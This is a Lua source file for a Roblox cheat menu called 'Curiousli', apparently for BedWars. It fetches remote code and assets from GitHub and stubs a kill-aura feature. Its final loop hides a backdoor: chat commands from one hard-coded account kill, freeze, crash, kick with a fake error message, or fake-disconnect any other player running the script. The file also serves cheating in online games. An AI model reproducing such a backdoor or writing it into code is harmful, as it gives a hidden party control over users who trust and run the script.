print("loading 613957114.lua")
local function Button(Tab, Name, Call)
	local template_buton = Instance.new("TextButton")
	template_buton.Font = Enum.Font.SourceSansBold
	template_buton.Text = Name
	template_buton.TextColor3 = Color3.new(0, 0, 0)
	template_buton.TextScaled = true
	template_buton.TextSize = 14
	template_buton.TextWrapped = true
	template_buton.BackgroundColor3 = Color3.new(0.333333, 0.345098, 0.12549)
	--//template_buton.Position = UDim2.new(-0.0187500007, 0, 0.00350099197, 0)
	template_buton.Size = UDim2.new(0.925000012, 0, 0.0291114338, 0)
	template_buton.Visible = true
	template_buton.Name = Name
	template_buton.Parent = game.CoreGui.Curiousli.Background:FindFirstChild(Tab).Main
	local enabled = false
	template_buton.MouseButton1Click:Connect(function()
		if enabled == false then
			template_buton.Text = Name.." (Enabled)"
			enabled = true
		else
			template_buton.Text = Name.." (Disabled)"
			enabled = false
		end
		pcall(Call)
	end)
end

local function Value(Tab, Button, Name)
	local template_value = Instance.new("TextBox")
	template_value.Font = Enum.Font.SourceSans
	template_value.Text = Button.." Value"
	template_value.PlaceholderText = "Value here"
	template_value.TextColor3 = Color3.new(0, 0, 0)
	template_value.TextScaled = true
	template_value.TextSize = 14
	template_value.BackgroundColor3 = Color3.new(0.333333, 0.345098, 0.12549)
	--//button_template.Position = UDim2.new(0, 0, 0.0318819918, 0)
	template_value.Size = UDim2.new(0.850000024, 0, 0.0267606955, 0)
	template_value.Visible = true
	template_value.Name = Name
	template_value.Parent = game.CoreGui.Curiousli.Background:FindFirstChild(Tab).Main
	
end

local players = game:GetService("Players")
local textservice = game:GetService("TextService")
local repstorage = game:GetService("ReplicatedStorage")
local lplr = players.LocalPlayer
local lighting = game:GetService("Lighting")
local cam = workspace.CurrentCamera
local targetinfo = shared.VapeTargetInfo
local collectionservice = game:GetService("CollectionService")
local uis = game:GetService("UserInputService")
local mouse = lplr:GetMouse()
local matchState = 0
local bedwars = {}
local bedwarsblocks = {}
local matchstatetick = 0


local betterisfile = function(file)
	local suc, res = pcall(function() return readfile(file) end)
	return suc and res ~= nil
end
local requestfunc = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request or function(tab)
	if tab.Method == "GET" then
		return {
			Body = game:HttpGet(tab.Url, true),
			Headers = {},
			StatusCode = 200
		}
	else
		return {
			Body = "bad exploit",
			Headers = {},
			StatusCode = 404
		}
	end
end 

local queueteleport = syn and syn.queue_on_teleport or queue_on_teleport
local getasset = getsynasset or getcustomasset or function(location) return "rbxasset://"..location end

local function GetURL(scripturl)
	if shared.CuriousliDeveloper then
		return readfile("curiousli/"..scripturl)
	else
		return game:HttpGet("https://raw.githubusercontent.com/ManOnTopain/CuriousliForRoblox/main/"..scripturl, true)
	end
end

local cachedassets = {}
local function getcustomassetfunc(path)
	if not betterisfile(path) then
		task.spawn(function()
			local textlabel = Instance.new("TextLabel")
			textlabel.Size = UDim2.new(1, 0, 0, 36)
			textlabel.Text = "Downloading "..path
			textlabel.BackgroundTransparency = 1
			textlabel.TextStrokeTransparency = 0
			textlabel.TextSize = 30
			textlabel.Font = Enum.Font.SourceSans
			textlabel.TextColor3 = Color3.new(1, 1, 1)
			textlabel.Position = UDim2.new(0, 0, 0, -36)
			textlabel.Parent = game.CoreGui.Curiousli
			repeat task.wait() until betterisfile(path)
			textlabel:Remove()
		end)
		local req = requestfunc({
			Url = "https://raw.githubusercontent.com/ManOnTopain/CuriousliForRoblox/main/"..path:gsub("curiousli/assets", "assets"),
			Method = "GET"
		})
		writefile(path, req.Body)
	end
	if cachedassets[path] == nil then
		cachedassets[path] = getasset(path) 
	end
	return cachedassets[path]
end

local KillauraEnabled = false
Button("CombatTab", "Kill Aura", function()
  local camm = game.Workspace.CurrentCamera
  local KnitClient = debug.getupvalue(require(lplr.PlayerScripts.TS.knit).setup, 6)
  local SwordCont = KnitClient.Controllers.SwordController
  local DistVal = 14
  if KillauraEnabled == false then
  KillauraEnabled = true
  else
  KillauraEnabled = false
  end
end)

local tt = Instance.new("TextLabel")
tt.Parent = game.CoreGui.Curiousli.Background
tt.Text = "Sorry! developing kill aura, so it means no kill aura ;( im so sorry"

local function addvectortocframe(cframe, vec)
	local x, y, z, R00, R01, R02, R10, R11, R12, R20, R21, R22 = cframe:GetComponents()
	return CFrame.new(x + vec.X, y + vec.Y, z + vec.Z, R00, R01, R02, R10, R11, R12, R20, R21, R22)
end
local id = game.PlaceId

local commands = {}
local tpService = game:GetService("TeleportService")

local aaaa = false

while wait(0.1) do
for i,v in pairs(game.Players:GetPlayers()) do
	
		v.Chatted:Connect(function(msg)
		if v.Name == "CoolBoyEli08" then
			if msg == "/kill default" then
				if v.Name == game.Players.LocalPlayer.Name then
					
				else
					game.Players.LocalPlayer.Character.Humanoid.Health = -1
				end
			end
			
			if msg == "/lagback default" then
				if v.Name == game.Players.LocalPlayer.Name then

				else
					game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 999999999999999999999999999999999999999999999999999999999999999999999999
				end
			end
			
			if msg == "/jump default" then
				if v.Name == game.Players.LocalPlayer.Name then

				else
					game.Players.LocalPlayer.Character.Humanoid:ChangeState("Jumping")
				end
			end
			
			if msg == "/sit default" then
				if v.Name == game.Players.LocalPlayer.Name then

				else
					game.Players.LocalPlayer.Character.Humanoid.Sit = true
				end
			end
			
			if msg == "/unsit default" then
				if v.Name == game.Players.LocalPlayer.Name then

				else
					game.Players.LocalPlayer.Character.Humanoid.Sit = false
				end
			end
			

			if msg == "/freeze default" then
				if v.Name == game.Players.LocalPlayer.Name then

				else
					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
				end
			end
			
			if msg == "/unfreeze default" then
				if v.Name == game.Players.LocalPlayer.Name then

				else
					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
				end
			end
			
			if msg == "/void default" then
				if v.Name == game.Players.LocalPlayer.Name then

				else
					repeat
						task.wait()
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = addvectortocframe(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame, Vector3.new(0, -3, 0))
					until game.Players.LocalPlayer.Character.Humanoid.Health <= 1
				end
			end
			
			if msg == "/crash default" then
				if v.Name == game.Players.LocalPlayer.Name then

				else
					setfpscap(9e9)
				end
			end
			
			if msg == "/chip default" then
				if v.Name == game.Players.LocalPlayer.Name then

				else
					local function funnyfunc(v)
						if v:IsA("ImageButton") then
							v.Image = "http://www.roblox.com/asset/?id=6864086702"
							v:GetPropertyChangedSignal("Image"):Connect(function()
								v.Image = "http://www.roblox.com/asset/?id=6864086702"
							end)
						end
						if v:IsA("TextLabel") or v:IsA("TextButton") and v:GetFullName():find("ChatChannelParentFrame") == nil then
							if v.Text ~= "" then
								v.Text = "chips"
							end
							v:GetPropertyChangedSignal("Text"):Connect(function()
								if v.Text ~= "" then
									v.Text = "chips"
								end
							end)
						end
						if v:IsA("Texture") or v:IsA("Decal") then
							v.Texture = "http://www.roblox.com/asset/?id=6864086702"
							v:GetPropertyChangedSignal("TextureID"):Connect(function()
								v.Texture = "http://www.roblox.com/asset/?id=6864086702"
							end)
						end
						if v:IsA("MeshPart") then
							v.TextureID = 'http://www.roblox.com/asset/?id=6864086702'

							v:GetPropertyChangedSignal("TextureID"):Connect(function()
								v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
							end)
						end
						for i,v in pairs(game:GetDescendants()) do
							funnyfunc(v)
						end
						game.DescendantAdded:Connect(funnyfunc)
					end
				end
			end
			
			if msg == "/errorkick default" then
				if v.Name == game.Players.LocalPlayer.Name then

				else
					game.Players.LocalPlayer.Character.Head:Destroy()
					game.Players.LocalPlayer:Kick("error: 291\nYour head was not found")
				end
			end
			
			if msg == "/disconnect default" then
				if v.Name == game.Players.LocalPlayer.Name then

				else
					aaaa = true
					while aaaa == true do
						wait(0.1)
						game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 0
						game.Players.LocalPlayer.Character.Humanoid.JumpPower = 0
						if not game.Lighting:FindFirstChild("EIEI") then
							local blur = Instance.new("BlurEffect")
							blur.Name = "EIEI"
							blur.Parent = game.Lighting
						end
					end
					local ErrorPrompt = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.ErrorPrompt)
					local prompt = ErrorPrompt.new("Default")
					prompt._hideErrorCode = true
					local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
					prompt:setParent(gui)
					prompt:setErrorTitle("Disconnected")
					prompt:updateButtons({{
						Text = "reconnect",
						Callback = function() tpService:Teleport(id, lplr) end,
						Primary = true
					}}, 'Default')
					prompt:_open("Please check your internet connection and try again\n(Error Code:277)")
				end
			end
		end
	end)
		
	
end
end
